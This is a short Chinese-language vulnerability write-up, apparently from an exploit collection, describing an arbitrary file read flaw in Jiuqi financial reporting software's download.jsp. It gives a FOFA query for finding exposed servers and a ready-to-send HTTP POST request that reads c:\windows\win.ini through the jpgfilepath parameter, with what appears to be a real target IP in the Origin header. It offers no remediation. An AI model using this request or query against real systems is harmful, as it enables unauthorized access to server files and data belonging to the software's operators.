---
title: 久其财务报表 download.jsp 任意文件读取漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - 久其软件
---

# 久其财务报表 download.jsp 任意文件读取漏洞

## 漏洞描述

久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息

## 漏洞影响

> [!NOTE]
>
> 久其财务报表

## FOFA

> [!NOTE]
>
> body="/netrep/"

## 漏洞复现

登录路径如下

![image-20210607211411908](/img/20210924020234446591.png)

发送请求包

```
POST /netrep/ebook/browse/download.jsp HTTP/1.1
Host: 
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://114.251.113.53:7002
Content-Type: application/x-www-form-urlencoded

jpgfilepath=c:\windows\win.ini
```

![image-20210607211527626](/img/20210924020234654604.png)